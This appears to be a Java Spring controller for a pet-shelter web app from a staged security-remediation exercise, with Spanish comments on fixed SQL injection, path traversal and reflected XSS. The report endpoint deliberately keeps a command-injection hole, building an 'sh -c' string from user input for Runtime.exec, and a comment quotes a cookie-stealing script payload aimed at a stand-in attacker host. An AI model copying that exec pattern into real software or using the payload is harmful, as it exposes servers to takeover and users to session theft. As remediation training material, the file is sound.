package com.shelter.app;

import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.HtmlUtils;

import javax.servlet.http.HttpSession;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

@Controller
public class ShelterController {

    static { DatabaseUtil.initDb(); }

    private static final String UPLOAD_DIR = "uploads/";

    @GetMapping("/")
    public String home() {
        return "index";
    }

    // -------------------------------------------------------------------
    // LOGIN
    // -------------------------------------------------------------------
    @GetMapping("/login")
    public String loginForm(Model model) {
        return "login";
    }

    @PostMapping("/login")
    public String login(@RequestParam String username,
                         @RequestParam String password,
                         HttpSession session,
                         Model model) {

        if (ShelterConfig.ADMIN_USERNAME.equals(username)
                && ShelterConfig.ADMIN_PASSWORD.equals(password)) {
            session.setAttribute("user", "admin");
            return "redirect:/dashboard";
        }

        try (Connection conn = DatabaseUtil.getConnection();
             PreparedStatement ps = conn.prepareStatement(
                     "SELECT password_hash FROM volunteers WHERE username = ?")) {
            ps.setString(1, username);
            ResultSet rs = ps.executeQuery();
            if (rs.next() && DatabaseUtil.checkPassword(password, rs.getString(1))) { // [FIX VULN-4]
                session.setAttribute("user", username);
                return "redirect:/dashboard";
            }
        } catch (SQLException e) {
            model.addAttribute("error", "Error interno");
            return "login";
        }

        model.addAttribute("error", "Credenciales invalidas");
        return "login";
    }

    @GetMapping("/dashboard")
    public String dashboard(HttpSession session, Model model) {
        Object user = session.getAttribute("user");
        if (user == null) return "redirect:/login";
        model.addAttribute("user", user);
        return "dashboard";
    }

    @GetMapping("/logout")
    public String logout(HttpSession session) {
        session.invalidate();
        return "redirect:/";
    }

    // -------------------------------------------------------------------
    // [FIX VULN-1] CWE-89: SQL Injection — corregido en Ronda 1
    // Se reemplazó la concatenación de `q` dentro del SQL por un
    // PreparedStatement con parámetro (`?`). El driver JDBC se encarga de
    // escapar el valor, por lo que `q` ya no puede alterar la estructura
    // de la consulta (p. ej. un UNION SELECT ya no funciona).
    // Cierra también el hallazgo de SonarQube "dynamically formatted SQL
    // query" reportado sobre esta misma línea.
    // -------------------------------------------------------------------
    @GetMapping("/search")
    public String search(@RequestParam(defaultValue = "") String q, Model model) {
        List<String[]> results = new ArrayList<>();
        String sql = "SELECT id, name, species, notes FROM pets WHERE name LIKE ?"; // [FIX VULN-1]

        try (Connection conn = DatabaseUtil.getConnection();
             PreparedStatement ps = conn.prepareStatement(sql)) {                    // [FIX VULN-1]
            ps.setString(1, "%" + q + "%");                                          // [FIX VULN-1]
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                results.add(new String[]{
                        rs.getString(1), rs.getString(2), rs.getString(3), rs.getString(4)
                });
            }
        } catch (SQLException e) {
            // ya no se ignora en silencio: se registra para diagnóstico,
            // sin exponer el stacktrace al usuario final
            System.err.println("Error en /search: " + e.getMessage());
        }

        model.addAttribute("results", results);
        model.addAttribute("query", q);
        return "search";
    }

    // -------------------------------------------------------------------
    // [VULN-2] CWE-78/88: Command Argument Injection — SIGUE ABIERTA
    // (se corrige en la Ronda 2, no en esta). Se deja el comportamiento
    // original para no adelantar esa corrección.
    //
    // [FIX] Reflected XSS (hallazgo no planeado de SonarQube, Blocker) —
    // corregido en esta Ronda 1. Antes, `petName` se devolvía tal cual en
    // el cuerpo de la respuesta HTTP (@ResponseBody, sin pasar por el
    // motor de plantillas), por lo que un valor como
    //     <script>document.location='http://attacker.evil/steal?c='+document.cookie</script>
    // se reflejaba sin escapar. Ahora se escapa con HtmlUtils.htmlEscape
    // antes de incluirlo en la respuesta.
    // -------------------------------------------------------------------
    @PostMapping("/generate-report")
    @ResponseBody
    public String generateReport(@RequestParam String petName) throws Exception {
        String command = "sh -c \"echo Reporte veterinario de " + petName +
                " > /tmp/report_" + petName + ".txt\"";                       // [VULN-2] pendiente Ronda 2
        Runtime.getRuntime().exec(command);                                   // [VULN-2] pendiente Ronda 2
        String safePetName = HtmlUtils.htmlEscape(petName);                   // [FIX XSS]
        return "Reporte generado para " + safePetName;                       // [FIX XSS]
    }

    // -------------------------------------------------------------------
    // [FIX VULN-5] CWE-22: Path Traversal — corregido en Ronda 1
    // Se resuelve `file` contra el directorio base con Path.resolve() y
    // se normaliza con normalize() para colapsar secuencias "..". Luego
    // se verifica explícitamente que la ruta resultante siga estando
    // DENTRO de UPLOAD_DIR (startsWith sobre las rutas absolutas). Si el
    // intento de escape se detecta, se responde 400 en vez de revelar si
    // el archivo objetivo existe o no, lo que también cierra el hallazgo
    // "Filesystem Oracle" reportado por SonarQube sobre este endpoint.
    // -------------------------------------------------------------------
    @GetMapping("/download")
    @ResponseBody
    public ResponseEntity<Resource> download(@RequestParam String file) {
        Path baseDir = Paths.get(UPLOAD_DIR).toAbsolutePath().normalize();     // [FIX VULN-5]
        Path target = baseDir.resolve(file).normalize();                      // [FIX VULN-5]

        if (!target.startsWith(baseDir)) {                                    // [FIX VULN-5]
            return ResponseEntity.badRequest().build();
        }
        if (!Files.exists(target)) {
            return ResponseEntity.notFound().build();
        }
        Resource resource = new FileSystemResource(target.toFile());
        return ResponseEntity.ok(resource);
    }
}
